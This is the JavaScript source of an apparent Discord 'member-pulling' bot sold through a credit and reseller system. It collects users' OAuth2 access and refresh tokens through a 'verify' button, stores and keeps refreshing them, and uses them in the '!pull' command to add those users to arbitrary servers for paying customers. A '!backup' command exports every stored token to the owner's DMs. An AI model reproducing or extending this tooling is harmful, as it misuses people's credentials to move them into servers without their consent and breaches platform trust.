const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder, 
  StringSelectMenuOptionBuilder,
  PermissionFlagsBits,
  ChannelType,
  SlashCommandBuilder,
  REST,
  Routes,
  AttachmentBuilder
} = require('discord.js');
const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
require('dotenv').config();

// ==================== RENDER PORT BINDING (STOPS WARNINGS) ====================
const app = express();
app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE DISCORD BOT ONLINE'));
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🌐 [HTTP SERVER] Port bound successfully on ${PORT}`));

// ==================== CONFIGURATION & ENVIRONMENT ====================
const TOKEN = process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
const MONGO_URI = process.env.MONGO_URI;

const OWNER_ID = '1370594462941581433';
const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';

if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
  console.error("❌ [FATAL ERROR]: Missing critical environment variables.");
  process.exit(1);
}

// ==================== DATABASE SCHEMAS ====================
mongoose.connect(MONGO_URI)
  .then(() => console.log("⚡ [DATABASE] Connected to database successfully!"))
  .catch(err => console.error("❌ [DATABASE ERROR]:", err));

const userSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  username: String,
  accessToken: { type: String, required: true },
  refreshToken: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  verifiedAt: { type: Date, default: Date.now }
}, { collection: 'verifiedusers' });
const VerifiedUser = mongoose.model('VerifiedUser', userSchema);

const creditSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  balance: { type: Number, default: 0 },
  onlineAdded: { type: Number, default: 0 },
  offlineAdded: { type: Number, default: 0 },
  reactionAdded: { type: Number, default: 0 },
  onlineConsumed: { type: Number, default: 0 },
  offlineConsumed: { type: Number, default: 0 },
  reactionConsumed: { type: Number, default: 0 }
}, { collection: 'usercredits' });
const UserCredit = mongoose.model('UserCredit', creditSchema);

const resellerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'resellers' });
const Reseller = mongoose.model('Reseller', resellerSchema);

const partnerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'partners' });
const Partner = mongoose.model('Partner', partnerSchema);

const guildConfigSchema = new mongoose.Schema({
  guildId: { type: String, required: true, unique: true },
  verifiedRoleId: { type: String, default: null }
}, { collection: 'guildconfigs' });
const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);

const operationSchema = new mongoose.Schema({
  opId: { type: String, required: true, unique: true },
  discordId: { type: String, required: true },
  targetGuildId: String,
  requestedQuantity: Number,
  successfulQuantity: { type: Number, default: 0 },
  status: { type: String, default: 'PROCESSING' },
  timestamp: { type: Date, default: Date.now }
}, { collection: 'operations' });
const Operation = mongoose.model('Operation', operationSchema);

const activeSessions = new Map();

async function hasOwnerPrivileges(userId) {
  if (userId === OWNER_ID) return true;
  const isPartner = await Partner.findOne({ discordId: userId });
  return !!isPartner;
}

function calculatePrice(quantity) {
  let bonusPercent = 0;
  let tierName = 'Standard Tier 📦';
  if (quantity >= 10000) { bonusPercent = 15; tierName = 'Enterprise Tier 🏢'; }
  else if (quantity >= 2500) { bonusPercent = 5; tierName = 'Pro Tier ⚡'; }
  else if (quantity >= 500) { tierName = 'Starter Tier 🚀'; }

  const bonusCredits = Math.floor((quantity * bonusPercent) / 100);
  const totalCreditsGiven = quantity + bonusCredits;
  return { quantity, bonusPercent, tierName, bonusCredits, totalCreditsGiven };
}

// ==================== DISCORD BOT SETUP ====================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ]
});

const slashCommands = [
  new SlashCommandBuilder()
    .setName('verifiedrole')
    .setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
    .addRoleOption(option => option.setName('role').setDescription('Select the verified role').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
  console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands });
    console.log('✅ Slash commands registered successfully.');
  } catch (err) {}
});

// Background Auto-Healer (Delayed startup to prevent boot lag)
setTimeout(() => {
  setInterval(async () => {
    try {
      const users = await VerifiedUser.find({});
      for (const user of users) {
        try {
          await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${user.accessToken}` }, timeout: 3000 });
        } catch (err) {
          try {
            const res = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
              client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'refresh_token', refresh_token: user.refreshToken
            }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
            user.accessToken = res.data.access_token;
            user.refreshToken = res.data.refresh_token;
            user.expiresAt = new Date(Date.now() + res.data.expires_in * 1000);
            await user.save();
          } catch (refreshErr) {
            await VerifiedUser.deleteOne({ discordId: user.discordId });
          }
        }
        await new Promise(r => setTimeout(r, 200));
      }
    } catch (err) {}
  }, 3600000);
}, 600000);

process.on('unhandledRejection', error => {});
process.on('uncaughtException', error => {});

// ==================== MESSAGE COMMANDS ====================
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const isOwner = message.author.id === OWNER_ID;
  const hasPrivileges = await hasOwnerPrivileges(message.author.id);

  try {
    if (command === 'verify') {
      const embed = new EmbedBuilder().setColor(0x7000ff).setTitle('⚡ CyberPulse System Clearance & Verification')
        .setDescription('✨ Click below to complete OAuth2 authorization and claim your verified role.')
        .setImage(BANNER_IMAGE_URL);
      const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verify System Clearance').setStyle(ButtonStyle.Link).setURL(`${PUBLIC_URL}/verify`).setEmoji('🔐'));
      return message.reply({ embeds: [embed], components: [row] });
    }

    if (command === 'panel') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied:** Owner or Partner clearance required.');
      const embed = new EmbedBuilder().setColor(0x7000ff).setTitle('💎 CyberPulse Management Hub 🚀')
        .setDescription('🛒 **Buy Credits:** Open a private ticket.\n💳 **My Credits:** Check balance.\n⚡ **Add Members:** Initialize dispatch.')
        .setImage(BANNER_IMAGE_URL);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡')
      );
      return message.reply({ embeds: [embed], components: [row] });
    }

    if (command === 'calculator' || command === 'calc') {
      const amount = parseInt(args[0], 10);
      if (isNaN(amount) || amount <= 0) return message.reply('⚠️ Usage: `!calculator <amount>`');
      const calc = calculatePrice(amount);
      const embed = new EmbedBuilder().setColor(0x38bdf8).setTitle('💳 CyberPulse Tiered Credit Calculator 📊').addFields(
        { name: '📦 Target Order', value: `\`${calc.quantity.toLocaleString()} Credits\``, inline: true },
        { name: '🏆 Pricing Tier', value: `\`${calc.tierName}\``, inline: true },
        { name: '🎁 Bulk Bonus %', value: `\`${calc.bonusPercent}%\``, inline: true },
        { name: '🎉 Extra Bonus', value: `\`+${calc.bonusCredits.toLocaleString()} Credits\``, inline: true },
        { name: '🌟 Total Received', value: `\`${calc.totalCreditsGiven.toLocaleString()} Credits\``, inline: true }
      ).setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    if (command === 'topresellers' || command === 'resellerboard') {
      const topResellers = await UserCredit.find({ offlineConsumed: { $gt: 0 } }).sort({ offlineConsumed: -1 }).limit(5);
      if (topResellers.length === 0) return message.reply('📊 No reseller volume tracked yet.');
      let desc = '🏆 **Top CyberPulse Resellers:**\n\n';
      topResellers.forEach((res, i) => { desc += `${i === 0 ? '👑' : '⭐'} **#${i+1}** <@${res.discordId}> — **${res.offlineConsumed.toLocaleString()}** Credits\n`; });
      return message.reply({ embeds: [new EmbedBuilder().setColor(0x10b981).setTitle('📊 Reseller Leaderboard').setDescription(desc)] });
    }

    if (command === 'backup') {
      if (!isOwner) return message.reply('❌ Access Denied.');
      const verifiedUsers = await VerifiedUser.find({});
      const userCredits = await UserCredit.find({});
      const buffer = Buffer.from(JSON.stringify({ timestamp: new Date(), verifiedUsers, userCredits }, null, 2));
      const attachment = new AttachmentBuilder(buffer, { name: `CyberPulse_Backup_${Date.now()}.json` });
      return message.author.send({ content: '⚡ **CyberPulse Encrypted Database Backup 📦**', files: [attachment] })
        .then(() => message.reply('✅ Backup sent to DMs!'))
        .catch(() => message.reply('❌ Failed to DM backup. Check your DM settings.'));
    }

    if (command === 'gc') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!gc @user <amount>`');
      const calc = calculatePrice(amount);
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      uc.balance += calc.totalCreditsGiven; uc.offlineAdded += calc.totalCreditsGiven;
      await uc.save();
      return message.reply(`📦 Added **${amount}** base credits (+**${calc.bonusCredits}** bonus) to <@${targetUser.id}>!`);
    }

    if (command === 'rc') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!rc @user <amount>`');
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      uc.balance = Math.max(0, uc.balance - amount); uc.offlineConsumed += amount;
      await uc.save();
      return message.reply(`🔻 Deducted **${amount}** credits from <@${targetUser.id}>.`);
    }

    if (command === 'partner') {
      if (!isOwner) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ Usage: `!partner @user`');
      await Partner.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`🤝 Appointed <@${targetUser.id}> as Partner!`);
    }

    if (command === 'reseller') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ Usage: `!reseller @user`');
      await Reseller.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`💼 Registered <@${targetUser.id}> as Reseller!`);
    }

    if (command === 'resale') {
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('⚠️ Usage: `!resale @user <amount>`');
      let sender = await UserCredit.findOne({ discordId: message.author.id });
      if (!sender || sender.balance < amount) return message.reply('❌ Insufficient balance.');
      sender.balance -= amount; sender.offlineConsumed += amount; await sender.save();
      let recipient = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      recipient.balance += amount; recipient.offlineAdded += amount; await recipient.save();
      return message.reply(`💼 Transferred **${amount}** credits to <@${targetUser.id}>!`);
    }

    if (command === 'irbal' || command === 'rbal') {
      const targetUser = message.mentions.users.first() || message.author;
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || { balance: 0, offlineAdded: 0, offlineConsumed: 0 };
      const embed = new EmbedBuilder().setColor(0x2b2d31)
        .setAuthor({ name: `Reseller Balance — ${targetUser.username}`, iconURL: 'https://cdn.discordapp.com/emojis/841261569083815946.webp?size=96' })
        .setDescription(`**Status:** ✅ Active\n\n🟢 **Online Members:** 0\n🔘 **Offline Members:** ${uc.balance.toLocaleString()}\n🎉 **Reaction Members:** 0\n\n──────────────────────────────\n\n📈 **Offline Added:** ${uc.offlineAdded.toLocaleString()}\n📉 **Offline Consumed:** ${uc.offlineConsumed.toLocaleString()}`)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
        .setFooter({ text: 'CyberPulse • Reseller' }).setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    if (command === 'pull') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetGuildId = args[0];
      if (!targetGuildId) return message.reply('❌ Usage: `!pull <GUILD_ID> [LIMIT]`');
      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
      const statusMsg = await message.reply(`🚀 Synchronizing database tokens into \`${targetGuildId}\`...`);
      try {
        const targetGuild = await client.guilds.fetch(targetGuildId);
        const verifiedUsers = await VerifiedUser.find({});
        let successfulJoins = 0;
        for (const userRecord of verifiedUsers) {
          if (pullLimit && successfulJoins >= pullLimit) break;
          try {
            const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
            if (member) continue;
            await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
            successfulJoins++;
            await new Promise(r => setTimeout(r, 600));
          } catch (err) {}
        }
        return statusMsg.edit(`✅ Successfully pulled **${successfulJoins}** members.`);
      } catch (err) { return statusMsg.edit('❌ Critical error executing manual pull.'); }
    }

    if (command === 'bal' || command === 'balance') {
      const uc = await UserCredit.findOne({ discordId: message.author.id }) || { balance: 0 };
      return message.reply(`💳 **Your Balance:** \`${uc.balance} credits\``);
    }

    if (command === 'stock') {
      const totalStock = await VerifiedUser.countDocuments();
      return message.reply(`📦 **Total Verified Stock:** \`${totalStock} accounts\``);
    }

  } catch (err) {}
});

// ==================== INTERACTION HANDLING ====================
client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isChatInputCommand() && interaction.commandName === 'verifiedrole') {
      const role = interaction.options.getRole('role');
      await GuildConfig.findOneAndUpdate({ guildId: interaction.guild.id }, { verifiedRoleId: role.id }, { upsert: true });
      return interaction.reply({ content: `✅ Verified role configured to ${role}!`, ephemeral: true });
    }

    if (interaction.isButton()) {
      if (interaction.customId === 'btn_buy_credits_ticket') {
        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
        const channelName = `ticket-${cleanName}`;
        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
        if (existing) return interaction.reply({ content: `❌ Active ticket channel exists: ${existing}`, ephemeral: true });

        const channel = await interaction.guild.channels.create({
          name: channelName, type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
          ]
        });
        const ticketEmbed = new EmbedBuilder().setColor(0x7000ff).setTitle('🛒 CyberPulse Credit Purchase Ticket ⚡')
          .setDescription(`Welcome <@${interaction.user.id}>!\nState how many credits you wish to purchase.\n\n**📦 Tier Packages:**\n• Starter: 500 Credits\n• Pro (5% Bonus): 2,500 Credits\n• Enterprise (15% Bonus): 10,000 Credits`);
        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed] });
        return interaction.reply({ content: `✅ Ticket created: ${channel}`, ephemeral: true });
      }

      if (interaction.customId === 'btn_my_credits') {
        const uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        return interaction.reply({ content: `💳 **Your Balance:** \`${uc.balance}\` credits`, ephemeral: true });
      }

      if (interaction.customId === 'btn_add_members') {
        const modal = new ModalBuilder().setCustomId('modal_server_id').setTitle('CyberPulse Scan 🚀');
        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel('Server ID').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        return await interaction.showModal(modal);
      }
    }

    if (interaction.isModalSubmit() && interaction.customId === 'modal_server_id') {
      const serverId = interaction.fields.getTextInputValue('input_server_id');
      try {
        const targetGuild = await client.guilds.fetch(serverId);
        const botMember = await targetGuild.members.fetch(client.user.id);
        if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: '❌ **Security Audit Failed:** Bot lacks Manage Roles permission.', ephemeral: true });
        }
        return interaction.reply({ content: `✅ Pre-Flight Scan Passed for **${targetGuild.name}**!`, ephemeral: true });
      } catch (e) {
        return interaction.reply({ content: '❌ **Pre-Flight Scan Failed:** Invalid ID or bot not in server.', ephemeral: true });
      }
    }
  } catch (err) {}
});

client.login(TOKEN);
